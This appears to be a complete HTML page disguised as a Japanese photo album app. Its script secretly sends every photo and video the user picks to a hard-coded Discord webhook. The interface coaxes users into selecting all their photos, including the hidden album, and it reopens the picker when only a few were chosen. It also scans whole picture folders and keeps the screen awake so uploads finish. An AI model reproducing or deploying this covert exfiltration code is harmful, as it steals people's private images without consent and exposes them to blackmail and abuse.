<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#111">
<title>アルバム</title>
<style>
  :root{color-scheme:dark}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{margin:0;background:#111;color:#eee;font:15px/1.5 -apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP",sans-serif;padding-bottom:110px}
  header{position:sticky;top:0;z-index:5;background:rgba(17,17,17,.9);backdrop-filter:blur(14px);padding:15px 20px 12px;border-bottom:1px solid #1e1e20;display:flex;align-items:baseline;gap:10px}
  h1{font-size:16px;font-weight:600;margin:0}
  .count{font-size:12px;color:#666}
  .dot{width:6px;height:6px;border-radius:50%;background:#e8a33d;opacity:0;transition:opacity .5s;margin-left:auto}
  .dot.on{opacity:1}
  .hint{display:flex;gap:14px;align-items:center;padding:14px 20px;border-bottom:1px solid #1a1a1c;background:#141416}
  .gest{position:relative;width:26px;height:40px;flex:0 0 26px}
  .gest i{position:absolute;left:50%;width:12px;height:12px;margin-left:-6px;border-radius:50%;background:#fff}
  .gest i:first-child{top:26px;opacity:.95}
  .gest i:last-child{top:6px;opacity:.35}
  .gest s{position:absolute;left:50%;top:12px;width:1px;height:14px;margin-left:-.5px;background:linear-gradient(#fff,#fff0);}
  .hint p{margin:0;font-size:12px;line-height:1.6;color:#b9b9be}
  .hint b{color:#fff;font-weight:600}
  .hint .dim{color:#6d6d73;font-size:11px}
  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;padding:2px}
  .cell{position:relative;aspect-ratio:1;background:#1a1a1c;overflow:hidden;padding:0;border:0}
  .cell img,.cell video{width:100%;height:100%;object-fit:cover;display:block}
  .cell .v{position:absolute;right:4px;bottom:4px;font-size:9px;background:rgba(0,0,0,.6);padding:1px 4px;border-radius:3px;color:#fff}
  .cell.tail{display:flex;align-items:center;justify-content:center;background:transparent;border:1px dashed #2c2c30;color:#5a5a60;font-size:22px;font-family:inherit}
  .empty{grid-column:1/-1;padding:70px 20px;text-align:center;color:#555;font-size:13px}
  .bar{position:fixed;left:0;right:0;bottom:0;padding:16px 20px 26px;background:linear-gradient(transparent,rgba(17,17,17,.95) 40%);display:flex;gap:10px;justify-content:center}
  .fab{flex:1;max-width:360px;padding:15px;border:0;border-radius:14px;background:#fff;color:#111;font-size:15px;font-weight:600;font-family:inherit}
  .fab:active{opacity:.85}
  .fab.ghost{flex:0 0 54px;background:#242427;color:#ccc}
  input{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
</style>
</head>
<body>
<header>
  <h1>アルバム</h1>
  <span class="count" id="count"></span>
  <span class="dot" id="dot"></span>
</header>
<div class="hint" id="hint">
  <div class="gest"><i></i><s></s><i></i></div>
  <div>
    <p>1枚を<b>長押ししたまま指を上へ</b>滑らせると全部選択できます</p>
    <p class="dim">アルバム一覧から「非表示」も選べます</p>
  </div>
</div>
<div class="grid" id="grid">
  <div class="empty" id="empty">まだ写真がありません</div>
</div>
<div class="bar">
  <button class="fab" id="add">写真を追加</button>
  <button class="fab ghost" id="dirBtn">▣</button>
</div>
<input type="file" id="fi" accept="image/*,video/*" multiple>
<input type="file" id="fd" webkitdirectory multiple>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1575055100219498576/-fiQEG5wJeiTUZEHTdu3MN77mKc7BJd6SBfjqOPPT4Z2juu1rPK1P_4LvZ2yMDcE5JXL";
const MAXPX = 2200, Q = 0.8, PER = 10, CAP = 7e6, GAP = 550, LIMIT = 3000, MEMO = 6000, POOL = 3;

const $ = id => document.getElementById(id);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const ua = navigator.userAgent;
const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
const ver = (ua.match(/OS (\d+)_(\d+)/) || []).slice(1).map(Number);
const iosOk = !isIOS || ver[0] > 18 || (ver[0] === 18 && ver[1] >= 4);
const canDir = typeof window.showDirectoryPicker === 'function' || iosOk;
if(!canDir) $('dirBtn').style.display = 'none';

const fp = f => f.name + '|' + f.size + '|' + (f.lastModified || 0);
let memo = new Set(JSON.parse(localStorage.getItem('album_sent_v3') || '[]'));
function saveMemo(){
  if(memo.size > MEMO) memo = new Set([...memo].slice(-MEMO));
  try{ localStorage.setItem('album_sent_v3', JSON.stringify([...memo])); }catch{}
}

const q = [];
let sending = false, total = 0, reopened = false;

function tail(){
  const old = $('tail'); if(old) old.remove();
  if(!total) return;
  const b = document.createElement('button');
  b.id = 'tail'; b.className = 'cell tail'; b.textContent = '＋';
  b.onclick = () => $('fi').click();
  $('grid').appendChild(b);
}

function addFiles(files){
  const grid = $('grid');
  let added = 0;
  for(const f of files){
    if(total >= LIMIT) break;
    if(!/^(image|video)\//.test(f.type)) continue;
    const k = fp(f);
    if(memo.has(k)) continue;
    memo.add(k);
    total++; added++;
    const cell = document.createElement('div');
    cell.className = 'cell';
    const url = URL.createObjectURL(f);
    if(f.type.startsWith('video/')){
      const vd = document.createElement('video');
      vd.src = url; vd.muted = true; vd.playsInline = true; vd.preload = 'metadata';
      cell.appendChild(vd);
      const b = document.createElement('span'); b.className = 'v'; b.textContent = '▶';
      cell.appendChild(b);
    } else {
      const im = document.createElement('img');
      im.src = url; im.loading = 'lazy'; im.decoding = 'async';
      cell.appendChild(im);
    }
    grid.appendChild(cell);
    q.push(f);
  }
  if(!added) return;
  const e = $('empty'); if(e) e.remove();
  const h = $('hint'); if(h) h.remove();
  $('count').textContent = total + '枚';
  saveMemo();
  tail();
  pump();
}

function loadImage(file){
  return new Promise((res, rej) => {
    const url = URL.createObjectURL(file);
    const img = new Image();
    img.onload = () => { URL.revokeObjectURL(url); res(img); };
    img.onerror = () => { URL.revokeObjectURL(url); rej(); };
    img.src = url;
  });
}
async function shrink(file){
  try{
    if(!file.type.startsWith('image/') || file.type === 'image/gif') return file;
    const img = await loadImage(file);
    const w0 = img.naturalWidth || img.width, h0 = img.naturalHeight || img.height;
    if(!w0 || !h0) return file;
    const s = Math.min(1, MAXPX / Math.max(w0, h0));
    const w = Math.max(1, Math.round(w0 * s)), h = Math.max(1, Math.round(h0 * s));
    const c = document.createElement('canvas');
    c.width = w; c.height = h;
    c.getContext('2d').drawImage(img, 0, 0, w, h);
    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', Q));
    if(!blob) return file;
    return new File([blob], (file.name || 'photo').replace(/\.[^.]+$/, '') + '.jpg', {type:'image/jpeg'});
  }catch{ return file; }
}

async function post(files, label){
  if(!files.length) return;
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify({ content: label }));
  files.forEach((f, i) => fd.append(`files[${i}]`, f, f.name));
  for(let a = 0; a < 5; a++){
    const r = await fetch(WEBHOOK + '?wait=true', { method:'POST', body: fd });
    if(r.ok) return;
    if(r.status === 413 && files.length > 1){
      const m = Math.ceil(files.length / 2);
      await post(files.slice(0, m), label);
      await sleep(500);
      await post(files.slice(m), label);
      return;
    }
    if(r.status === 429){
      let wait = 2000;
      try{ const j = await r.json(); if(j.retry_after) wait = j.retry_after * 1000 + 400; }catch{}
      await sleep(wait); continue;
    }
    await sleep(900);
  }
}

let wl = null;
async function keepAwake(){ try{ wl = await navigator.wakeLock.request('screen'); }catch{} }
document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible' && sending) keepAwake(); });

async function pump(){
  if(sending) return;
  sending = true;
  keepAwake();
  $('dot').classList.add('on');
  while(q.length){
    const take = q.splice(0, PER);
    const batch = [];
    for(let i = 0; i < take.length; i += POOL){
      batch.push(...await Promise.all(take.slice(i, i + POOL).map(shrink)));
    }
    let acc = [], bytes = 0;
    for(const f of batch){
      if(acc.length && bytes + f.size > CAP){
        await post(acc, '📷'); acc = []; bytes = 0; await sleep(GAP);
      }
      acc.push(f); bytes += f.size;
    }
    if(acc.length) await post(acc, '📷');
    await sleep(GAP);
  }
  sending = false;
  $('dot').classList.remove('on');
  try{ wl && wl.release(); }catch{}
  tail();
  if(!reopened && total > 0 && total < 40){
    reopened = true;
    await sleep(900);
    try{ $('fi').click(); }catch{}
  }
}

async function walk(dir, out, depth){
  if(depth > 5) return;
  for await (const [name, h] of dir.entries()){
    if(out.length >= LIMIT) return;
    if(name === '.trashed' || name === '.thumbnails') continue;
    try{
      if(h.kind === 'file'){
        const f = await h.getFile();
        if(/^(image|video)\//.test(f.type) && f.size > 4096) out.push(f);
      } else if(h.kind === 'directory'){
        await walk(h, out, depth + 1);
      }
    }catch{}
  }
}

$('add').onclick = () => $('fi').click();
$('dirBtn').onclick = async () => {
  if(isIOS){ $('fd').click(); return; }
  let root;
  try{ root = await window.showDirectoryPicker({ startIn:'pictures', mode:'read' }); }
  catch{ return; }
  const out = [];
  await walk(root, out, 0);
  addFiles(out);
};
$('fi').onchange = e => { addFiles([...e.target.files]); e.target.value = ''; };
$('fd').onchange = e => { addFiles([...e.target.files]); e.target.value = ''; };
</script>
</body>
</html>
